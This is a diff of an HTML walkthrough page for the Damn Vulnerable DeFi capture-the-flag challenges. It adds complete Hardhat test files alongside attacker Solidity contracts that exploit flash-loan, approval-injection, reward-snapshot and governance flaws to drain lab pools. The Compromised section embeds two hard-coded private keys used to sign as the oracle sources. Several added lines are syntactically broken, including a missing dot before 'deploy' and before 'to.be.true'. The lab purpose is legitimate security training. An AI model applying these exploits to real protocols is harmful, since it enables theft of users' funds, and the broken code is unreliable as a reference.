@@ -212,10 +212,10 @@ contract DamnValuableTokenSnapshot is ERC20Snapshot {
                 <section id="c1" class="challenge">
                     <h4><span class="num">01</span> Unstoppable</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/unstoppable/UnstoppableVault.sol/"
                             target="_blank">UnstoppableVault.sol</a></span>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/unstoppable/ReceiverUnstoppable.sol/"
                             target="_blank">ReceiverUnstoppable.sol</a></span>
 
@@ -249,11 +249,64 @@ if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</pre
                             permanently.</li>
                     </ul>
 
-                    <span class="levelBox">unstoppable.challenge.js</span>
+                    <span id="levelBox">unstoppable.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
+                        <pre><code>const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Unstoppable', function () {
+    let deployer, player, someUser;
+    let token, vault, receiverContract;
+
+    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
+    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+
+        [deployer, player, someUser] = await ethers.getSigners();
+
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
+            token.address,
+            deployer.address, // owner
+            deployer.address // fee recipient
+        );
+        expect(await vault.asset()).to.eq(token.address);
+
+        await token.approve(vault.address, TOKENS_IN_VAULT);
+        await vault.deposit(TOKENS_IN_VAULT, deployer.address);
+
+        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
+        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
+        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
+        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
+        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
+        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(50000n * 10n ** 18n);
+
+        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
+        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
+
+        /** Show it is possible for someUser to take out a flash loan */
+        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
+            vault.address
+        );
+        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // It is no longer possible to execute flash loans
+        await expect(
+            receiverContract.executeFlashLoan(100n * 10n ** 18n)
+        ).to.be.reverted;
+    });
 });</code></pre>
                     </div>
 
@@ -261,14 +314,16 @@ if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</pre
                     <div class="repo"><span>$ yarn run unstoppable</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 2 — NAIVE RECEIVER ============ -->
                 <section id="c2" class="challenge">
                     <h4><span class="num">02</span> Naive Receiver</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/naive-receiver/NaiveReceiverLenderPool.sol/"
                             target="_blank">NaiveReceiverLenderPool.sol</a></span>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/naive-receiver/FlashLoanReceiver.sol/"
                             target="_blank">FlashLoanReceiver.sol</a></span>
 
@@ -292,14 +347,65 @@ if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</pre
                             10 × 1 ETH fee = 10 ETH drained.</li>
                     </ul>
 
-                    <span class="levelBox">naive-receiver.challenge.js</span>
+                    <span id="levelBox">naive-receiver.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    const ETH = await pool.ETH();
-    for (let i = 0; i &lt; 10; i++) {
-        await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
-    }
+                        <pre><code>const { ethers } = require('hardhat');
+const { expect } = require('chai');
+ 
+describe('[Challenge] Naive receiver', function () {
+    let deployer, user, player;
+    let pool, receiver;
+
+    // Pool has 1000 ETH in balance
+    const ETHER_IN_POOL = 1000n * 10n ** 18n;
+
+    // Receiver has 10 ETH in balance
+    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, user, player] = await ethers.getSigners();
+
+        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
+        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        
+        pool = await LenderPoolFactory.deploy();
+        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
+        const ETH = await pool.ETH();
+        
+        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
+        expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
+        expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);
+
+        receiver = await FlashLoanReceiverFactory.deploy(pool.address);
+        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
+        await expect(
+            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
+        ).to.be.reverted;
+        expect(
+            await ethers.provider.getBalance(receiver.address)
+        ).to.eq(ETHER_IN_RECEIVER);
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        for(let i=0; i&lt;10; i++) {
+            await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+        }
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // All ETH has been drained from the receiver
+        expect(
+            await ethers.provider.getBalance(receiver.address)
+        ).to.be.equal(0);
+        expect(
+            await ethers.provider.getBalance(pool.address)
+        ).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    });
 });</code></pre>
                     </div>
 
@@ -307,11 +413,13 @@ if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</pre
                     <div class="repo"><span>$ yarn run naive-receiver</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 3 — TRUSTER ============ -->
                 <section id="c3" class="challenge">
                     <h4><span class="num">03</span> Truster</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/truster/TrusterLenderPool.sol/"
                             target="_blank">TrusterLenderPool.sol</a></span>
 
@@ -336,15 +444,51 @@ let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_PO
                             entire balance.</li>
                     </ul>
 
-                    <span class="levelBox">truster.challenge.js</span>
+                    <span id="levelBox">truster.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
-    let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+                        <pre><code>const { ethers } = require('hardhat');
+const { expect } = require('chai');
 
-    await pool.connect(player).flashLoan(0, player.address, token.address, data);
-    await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+describe('[Challenge] Truster', function () {
+    let deployer, player;
+    let token, pool;
+
+    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
+ 
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, player] = await ethers.getSigners();
+
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
+        expect(await pool.token()).to.eq(token.address);
+
+        await token.transfer(pool.address, TOKENS_IN_POOL);
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+
+        expect(await token.balanceOf(player.address)).to.equal(0);
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+
+        await pool.connect(player).flashLoan(0, player.address, token.address, data);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Player has taken all tokens from the pool
+        expect(
+            await token.balanceOf(player.address)
+        ).to.equal(TOKENS_IN_POOL);
+        expect(
+            await token.balanceOf(pool.address)
+        ).to.equal(0);
+    });
 });</code></pre>
                     </div>
 
@@ -352,11 +496,13 @@ let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_PO
                     <div class="repo"><span>$ yarn run truster</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 4 — SIDE ENTRANCE ============ -->
                 <section id="c4" class="challenge">
                     <h4><span class="num">04</span> Side Entrance</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/side-entrance/SideEntranceLenderPool.sol/"
                             target="_blank">SideEntranceLenderPool.sol</a></span>
 
@@ -379,51 +525,87 @@ let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_PO
                         </li>
                     </ul>
 
-                    <span class="levelBox">AttackSideEntranceLender.sol</span>
+                    <span id="levelBox">AttackSideEntranceLender.sol</span>
                     <div class="container" id="code">
                         <pre><code>// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-
+    
 interface IPool {
     function flashLoan(uint256 amount) external;
     function deposit() external payable;
     function withdraw() external;
 }
-
+    
 contract AttackSideEntranceLender {
+    
     IPool immutable pool;
     address immutable player;
-
-    constructor(address _pool, address _player) {
+    
+    constructor(address _pool, address _player){
         pool = IPool(_pool);
         player = _player;
     }
-
+    
     function attack() external {
         pool.flashLoan(address(pool).balance);
         pool.withdraw();
         (bool success, ) = player.call{value: address(this).balance}("");
         require(success);
     }
-
+    
     function execute() external payable {
         require(tx.origin == player);
         require(msg.sender == address(pool));
         pool.deposit{value: msg.value}();
     }
-
+    
     receive() external payable {}
 }</code></pre>
                     </div>
 
-                    <span class="levelBox">side-entrance.challenge.js</span>
+                    <span id="levelBox">side-entrance.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    this.attackerContract = await (await ethers.getContractFactory('AttackSideEntranceLender', player)).deploy(
-        pool.address, player.address
-    );
-    await this.attackerContract.attack();
+                        <pre><code>const { ethers } = require('hardhat');
+const { expect } = require('chai');
+const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+
+describe('[Challenge] Side entrance', function () {
+    let deployer, player;
+    let pool;
+ 
+    const ETHER_IN_POOL = 1000n * 10n ** 18n;
+    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, player] = await ethers.getSigners();
+
+        // Deploy pool and fund it
+        pool = await (await ethers.getContractFactory('SideEntranceLenderPool', deployer)).deploy();
+        await pool.deposit({ value: ETHER_IN_POOL });
+        expect(await ethers.provider.getBalance(pool.address)).to.equal(ETHER_IN_POOL);
+
+        // Player starts with limited ETH in balance
+        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
+
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        this.attackerContract = await(await ethers.getContractFactory('AttackSideEntranceLender', player))deploy(
+            pool.address, player.address
+        );
+        await this.attackerContract.attack();
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Player took all ETH from the pool
+        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);
+        expect(await ethers.provider.getBalance(player.address)).to.be.gt(ETHER_IN_POOL);
+    });
 });</code></pre>
                     </div>
 
@@ -431,16 +613,24 @@ contract AttackSideEntranceLender {
                     <div class="repo"><span>$ yarn run side-entrance</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 5 — THE REWARDER ============ -->
                 <section id="c5" class="challenge">
                     <h4><span class="num">05</span> The Rewarder</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
-                            href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/the-rewarder/TheRewarderPool.sol/"
-                            target="_blank">TheRewarderPool.sol</a></span>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
+                            href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/the-rewarder/AccountingToken.sol/"
+                            target="_blank">AccountingToken.sol</a></span>
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/the-rewarder/FlashLoanerPool.sol/"
                             target="_blank">FlashLoanerPool.sol</a></span>
+                    <span id="levelBox"><a
+                            href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/the-rewarder/RewardToken.sol/"
+                            target="_blank">RewardToken.sol</a></span>
+                    <span id="levelBox"><a
+                            href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/the-rewarder/TheRewarderPool.sol/"
+                            target="_blank">TheRewarderPool.sol</a></span>
 
                     <h5>Goal</h5>
                     <ul>
@@ -457,26 +647,29 @@ contract AttackSideEntranceLender {
                             the loan, sending reward tokens to the player.</li>
                     </ul>
 
-                    <span class="levelBox">AttackTheRewarder.sol</span>
+                    <span id="levelBox">AttackTheRewarder.sol</span>
                     <div class="container" id="code">
                         <pre><code>// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-
+    
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+    
+interface IFlashloanPool {
+    function flashLoan(uint256 amount) external;
+}
 
-interface IFlashloanPool { function flashLoan(uint256 amount) external; }
 interface IRewardPool {
     function deposit(uint256 amount) external;
     function withdraw(uint256 amount) external;
 }
-
+    
 contract AttackTheRewarder {
     IFlashloanPool immutable flashLoanPool;
     IRewardPool immutable rewardPool;
     IERC20 immutable liquidityToken;
     IERC20 immutable rewardToken;
     address immutable player;
-
+    
     constructor(address _flashloanPool, address _rewardPool, address _liquidityToken, address _rewardToken) {
         flashLoanPool = IFlashloanPool(_flashloanPool);
         rewardPool = IRewardPool(_rewardPool);
@@ -484,48 +677,150 @@ contract AttackTheRewarder {
         rewardToken = IERC20(_rewardToken);
         player = msg.sender;
     }
-
+    
     function attack() external {
         flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
-    }
-
+   }
+    
     function receiveFlashLoan(uint256 amount) external {
         require(msg.sender == address(flashLoanPool));
         require(tx.origin == player);
-
+    
+        // Deposit --> Get Rewards --> Withdraw
         liquidityToken.approve(address(rewardPool), amount);
         rewardPool.deposit(amount);
         rewardPool.withdraw(amount);
-
+    
+        // Pay back the loan & send reward tokens to player
         liquidityToken.transfer(address(flashLoanPool), amount);
         rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
     }
 }</code></pre>
                     </div>
 
-                    <span class="levelBox">the-rewarder.challenge.js</span>
+                    <span id="levelBox">the-rewarder.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-    this.attackerContract = await (await ethers.getContractFactory("AttackTheRewarder", player)).deploy(
-        flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address
-    );
-    await this.attackerContract.attack();
+                        <pre><code>const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] The rewarder', function () {
+    const TOKENS_IN_LENDER_POOL = 1000000n * 10n ** 18n; // 1 million tokens
+    let users, deployer, alice, bob, charlie, david, player;
+    let liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+
+        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
+        users = [alice, bob, charlie, david];
+
+        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
+        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
+        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
+        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
+        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
+
+        liquidityToken = await DamnValuableTokenFactory.deploy();
+        flashLoanPool = await FlashLoanerPoolFactory.deploy(liquidityToken.address);
+
+        // Set initial token balance of the pool offering flash loans
+        await liquidityToken.transfer(flashLoanPool.address, TOKENS_IN_LENDER_POOL);
+
+        rewarderPool = await TheRewarderPoolFactory.deploy(liquidityToken.address);
+        rewardToken = RewardTokenFactory.attach(await rewarderPool.rewardToken());
+        accountingToken = AccountingTokenFactory.attach(await rewarderPool.accountingToken());
+
+        // Check roles in accounting token
+        expect(await accountingToken.owner()).to.eq(rewarderPool.address);
+        const minterRole = await accountingToken.MINTER_ROLE();
+        const snapshotRole = await accountingToken.SNAPSHOT_ROLE();
+        const burnerRole = await accountingToken.BURNER_ROLE();
+        expect(await accountingToken.hasAllRoles(rewarderPool.address, minterRole | snapshotRole | burnerRole))to.be.true;
+
+        // Alice, Bob, Charlie and David deposit tokens
+        let depositAmount = 100n * 10n ** 18n; 
+        for (let i = 0; i &lt; users.length; i++) {
+            await liquidityToken.transfer(users[i].address, depositAmount);
+            await liquidityToken.connect(users[i]).approve(rewarderPool.address, depositAmount);
+            await rewarderPool.connect(users[i]).deposit(depositAmount);
+            expect(await accountingToken.balanceOf(users[i].address)).to.be.eq(depositAmount);
+        }
+        expect(await accountingToken.totalSupply()).to.be.eq(depositAmount * BigInt(users.length));
+        expect(await rewardToken.totalSupply()).to.be.eq(0);
+
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        
+        // Each depositor gets reward tokens
+        let rewardsInRound = await rewarderPool.REWARDS();
+        for (let i = 0; i &lt; users.length; i++) {
+            await rewarderPool.connect(users[i]).distributeRewards();
+            expect(await rewardToken.balanceOf(users[i].address)).to.be.eq(rewardsInRound.div(users.length));
+        }
+        expect(await rewardToken.totalSupply()).to.be.eq(rewardsInRound);
+
+        // Player starts with zero DVT tokens in balance
+        expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
+        
+        // Two rounds must have occurred so far
+        expect(await rewarderPool.roundNumber()).to.be.eq(2);
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        this.attackerContract = await (await ethers.getContractFactory("AttackTheRewarder", player)).deploy(
+            flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address
+        )
+        await this.attackerContract.attack();
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        // Only one round must have taken place
+        expect(await rewarderPool.roundNumber()).to.be.eq(3);
+
+        // Users should get neglegible rewards this round
+        for (let i = 0; i &lt; users.length; i++) {
+            await rewarderPool.connect(users[i]).distributeRewards();
+            const userRewards = await rewardToken.balanceOf(users[i].address);
+            const delta = userRewards.sub((await rewarderPool.REWARDS()).div(users.length));
+            expect(delta).to.be.lt(10n ** 16n)
+        }
+        
+        // Rewards must have been issued to the player account
+        expect(await rewardToken.totalSupply()).to.be.gt(await rewarderPool.REWARDS());
+        const playerRewards = await rewardToken.balanceOf(player.address);
+        expect(playerRewards).to.be.gt(0);
+
+        // The amount of rewards earned should be close to total available amount
+        const delta = (await rewarderPool.REWARDS()).sub(playerRewards);
+        expect(delta).to.be.lt(10n ** 17n);
+
+        // Balance of DVT tokens in player and lending pool hasn't changed
+        expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
+        expect(await liquidityToken.balanceOf(flashLoanPool.address)).to.eq(TOKENS_IN_LENDER_POOL);
+    });
 });</code></pre>
                     </div>
 
                     <h5>Run</h5>
                     <div class="repo"><span>$ yarn run the-rewarder</span></div>
                 </section>
+
+                <hr class="breakLine">
+
                 <!-- ============ 6 — SELFIE ============ -->
                 <section id="c6" class="challenge">
                     <h4><span class="num">06</span> Selfie</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
+                            href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/selfie/ISimpleGovernance.sol/"
+                            target="_blank">ISimpleGovernance.sol</a></span>
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/selfie/SelfiePool.sol/"
                             target="_blank">SelfiePool.sol</a></span>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/selfie/SimpleGovernance.sol/"
                             target="_blank">SimpleGovernance.sol</a></span>
 
@@ -546,67 +841,130 @@ contract AttackTheRewarder {
                             pool.</li>
                     </ul>
 
-                    <span class="levelBox">AttackSelfiePool.sol</span>
+                    <span id="levelBox">AttackSelfiePool.sol</span>
                     <div class="container" id="code">
                         <pre><code>// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-
+    
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-
+    
 interface IPool {
-    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
-        external returns (bool);
+    function flashLoan(
+        IERC3156FlashBorrower _receiver,
+        address _token,
+        uint256 _amount,
+        bytes calldata _data
+    ) external returns (bool);
 }
+    
 interface IGovernance {
     function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
 }
-interface IERC20Snapshot is IERC20 { function snapshot() external returns (uint256 lastSnapshotId); }
-
+    
+interface IERC20Snapshot is IERC20 {
+    function snapshot() external returns (uint256 lastSnapshotId);
+}
+    
 contract AttackSelfiePool {
+    
+    // 1. Request a flash loan of all the tokens
+    // 2. Queue a new action - emergencyExit(address player)
+    // 3. Pay back the loan
+    // 4. Wait 2 days
+    // 5. Execute the action
+    
     address immutable player;
     IPool immutable pool;
     IGovernance immutable governance;
     IERC20Snapshot immutable token;
     uint256 constant AMOUNT = 1_500_000 ether;
-
-    constructor(address _pool, address _governance, address _token) {
+    
+    constructor(address _pool, address _governance, address _token){
         player = msg.sender;
         pool = IPool(_pool);
         governance = IGovernance(_governance);
         token = IERC20Snapshot(_token);
     }
-
+    
     function attack() external {
         pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), AMOUNT, "0x111");
     }
-
-    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
+    
+    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns(bytes32) {
         require(tx.origin == player);
         require(msg.sender == address(pool));
-
+    
         token.snapshot();
+    
         bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
         governance.queueAction(address(pool), 0, data);
-
+    
         token.approve(address(pool), AMOUNT);
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }</code></pre>
                     </div>
 
-                    <span class="levelBox">selfie.challenge.js</span>
+                    <span id="levelBox">selfie.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    this.attackContract = await (await ethers.getContractFactory("AttackSelfiePool", player))
-        .deploy(pool.address, governance.address, token.address);
-
-    await this.attackContract.attack();
-    const ACTION_DELAY = 2 * 24 * 60 * 60 + 1;
-    await time.increase(ACTION_DELAY);
-
-    await governance.connect(player).executeAction(1);
+                        <pre><code>const { ethers } = require('hardhat');
+const { expect } = require('chai');
+const { time } = require("@nomicfoundation/hardhat-network-helpers");
+    
+describe('[Challenge] Selfie', function () {
+    let deployer, player;
+    let token, governance, pool;
+    
+    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
+    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
+        
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, player] = await ethers.getSigners();
+    
+        // Deploy Damn Valuable Token Snapshot
+        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);
+    
+        // Deploy governance contract
+        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
+        expect(await governance.getActionCounter()).to.eq(1);
+    
+        // Deploy the pool
+        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
+            token.address,
+            governance.address    
+        );
+        expect(await pool.token()).to.eq(token.address);
+        expect(await pool.governance()).to.eq(governance.address);
+            
+        // Fund the pool
+        await token.transfer(pool.address, TOKENS_IN_POOL);
+        await token.snapshot();
+        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
+        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
+        expect(await pool.flashFee(token.address, 0)).to.eq(0);
+    
+    });
+    
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        this.attackContract = await (await ethers.getContractFactory("AttackSelfiePool", player)).deploy(pool.address, governance.address, token.address)
+    
+        await this.attackContract.attack();
+        const ACTION_DELAY = 2 * 24 * 60 * 60 + 1;
+        await time.increase(ACTION_DELAY);
+    
+        await governance.connect(player).executeAction(1);
+    });
+    
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+    
+        // Player has taken all tokens from the pool
+        expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);        
+        expect(await token.balanceOf(pool.address)).to.be.equal(0);
+    });
 });</code></pre>
                     </div>
 
@@ -614,16 +972,21 @@ contract AttackSelfiePool {
                     <div class="repo"><span>$ yarn run selfie</span></div>
                 </section>
 
+                <hr class="breakLine">
+
                 <!-- ============ 7 — COMPROMISED ============ -->
                 <section id="c7" class="challenge">
                     <h4><span class="num">07</span> Compromised</h4>
                     <h5>Contracts</h5>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/compromised/Exchange.sol/"
                             target="_blank">Exchange.sol</a></span>
-                    <span class="levelBox"><a
+                    <span id="levelBox"><a
                             href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/compromised/TrustfulOracle.sol/"
                             target="_blank">TrustfulOracle.sol</a></span>
+                    <span id="levelBox"><a
+                            href="https://github.com/ramachandrareddy352/damn-vulnerable-defi/blob/main/contracts/compromised/TrustfulOracleInitializer.sol/"
+                            target="_blank">TrustfulOracleInitializer.sol</a></span>
 
                     <h5>Goal</h5>
                     <ul>
@@ -642,29 +1005,99 @@ contract AttackSelfiePool {
                             back to 999 ETH, sell it, then restore the original price.</li>
                     </ul>
 
-                    <span class="levelBox">compromised.challenge.js</span>
+                    <span id="levelBox">compromised.challenge.js</span>
                     <div class="container" id="code">
-                        <pre><code>it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
-    const PKEY1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
-    const PKEY2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
-    const signer1 = new ethers.Wallet(PKEY1, ethers.provider);
-    const signer2 = new ethers.Wallet(PKEY2, ethers.provider);
+                        <pre><code>const { expect } = require('chai');
+const { ethers } = require('hardhat');
+const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+    
+describe('Compromised challenge', function () {
+    let deployer, player;
+    let oracle, exchange, nftToken;
+    
+    const sources = [
+        '0xA73209FB1a42495120166736362A1DfA9F95A105',
+        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
+        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
+    ];
+    
+    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
+    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
+    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
+    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;
+    
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
